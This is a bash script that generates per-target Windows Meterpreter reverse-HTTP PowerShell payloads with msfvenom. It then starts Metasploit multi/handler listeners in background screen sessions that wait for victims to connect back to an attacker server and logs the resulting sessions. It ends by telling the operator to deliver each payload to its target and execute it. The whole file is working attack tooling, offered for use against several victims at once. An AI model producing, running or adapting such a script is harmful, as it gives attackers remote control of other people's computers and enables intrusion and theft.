#!/bin/bash

# Check if a target number is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_number> (e.g., 1 for target 1, 2 for target 2)"
    exit 1
fi

# Variables
TARGET_NUM=$1
BASE_PORT=9000
LHOST="server_ip"
LPORT=$((BASE_PORT + TARGET_NUM))  # e.g., 9000 + 1 = 9001 for target 1
PAYLOAD_FILE="meterpreter_target_${TARGET_NUM}.ps1"
RC_FILE="handler_target_${TARGET_NUM}.rc"
LOG_FILE="/home/ec2-user/meterpreter_sessions_target_${TARGET_NUM}.log"
SCREEN_NAME="msf_target_${TARGET_NUM}"

# Generate the payload
echo "Generating payload for target $TARGET_NUM (LPORT=$LPORT)..."
msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out "$PAYLOAD_FILE" LHOST="$LHOST" LPORT="$LPORT" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "Payload created: $PAYLOAD_FILE"
else
    echo "Error generating payload. Check msfvenom installation."
    exit 1
fi

# Create Metasploit resource script
cat > "$RC_FILE" <<EOF
use multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_http
set LHOST 0.0.0.0
set LPORT $LPORT
set ExitOnSession false
spool $LOG_FILE
exploit -j -z
EOF

# Start listener in a screen session
echo "Starting listener for target $TARGET_NUM on port $LPORT..."
screen -dmS "$SCREEN_NAME" bash -c "msfconsole -r $RC_FILE"
sleep 2  # Give it a moment to start

# Verify screen session
if screen -list | grep -q "$SCREEN_NAME"; then
    echo "Listener started in background (screen: $SCREEN_NAME, port: $LPORT)"
    echo "Payload file: $PAYLOAD_FILE"
    echo "Log file: $LOG_FILE"
    echo "To reconnect: screen -r $SCREEN_NAME"
    echo "To check sessions later: ssh in, then 'screen -r $SCREEN_NAME' and 'sessions -l'"
else
    echo "Error starting listener. Check screen and msfconsole."
    exit 1
fi

# Reminder
echo "Deliver $PAYLOAD_FILE to target $TARGET_NUM and execute it."
